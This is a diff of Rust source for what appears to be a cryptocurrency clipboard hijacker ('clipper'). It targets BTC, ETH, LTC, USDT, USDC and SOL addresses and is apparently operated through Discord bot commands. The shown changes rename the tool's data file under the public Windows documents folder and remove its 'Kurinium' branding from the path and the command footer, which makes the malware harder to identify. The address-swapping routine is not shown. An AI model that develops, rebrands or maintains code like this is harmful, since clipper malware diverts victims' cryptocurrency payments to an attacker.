@@ -13,17 +13,17 @@ use std::fs;
 use std::io::{Write, BufRead, BufReader};
 use regex::Regex;
 
-const CLIPPER_DB_PATH: &str = "C:\\Users\\Public\\Documents\\kurinium_clipper.txt";
+const CLIPPER_DB_PATH: &str = "C:\\Users\\Public\\Documents\\clip.txt";
 const CRYPTO_WARNING: &str = "please set the clipper.";
 
 static CLIPPER_STATE: Lazy<RwLock<ClipperState>> = Lazy::new(|| {
     let mut crypto_warnings = HashMap::new();
-    crypto_warnings.insert(CryptoType::BTC, CRYPTO_WARNING.to_string());
-    crypto_warnings.insert(CryptoType::ETH, CRYPTO_WARNING.to_string());
-    crypto_warnings.insert(CryptoType::LTC, CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::BTC,  CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::ETH,  CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::LTC,  CRYPTO_WARNING.to_string());
     crypto_warnings.insert(CryptoType::USDT, CRYPTO_WARNING.to_string());
     crypto_warnings.insert(CryptoType::USDC, CRYPTO_WARNING.to_string());
-    crypto_warnings.insert(CryptoType::SOL, CRYPTO_WARNING.to_string());
+    crypto_warnings.insert(CryptoType::SOL,  CRYPTO_WARNING.to_string());
 
     RwLock::new(ClipperState {
         is_running: false,
@@ -218,7 +218,7 @@ impl ClipperCommand {
                         `.clipper on`".to_string(),
                 inline: false,
             })
-            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new("Kurinium Utility Commands"))
+            .footer(twilight_util::builder::embed::EmbedFooterBuilder::new("Utility Commands"))
             .build();
 
         http.create_message(msg.channel_id).embeds(&[embed]).await?;
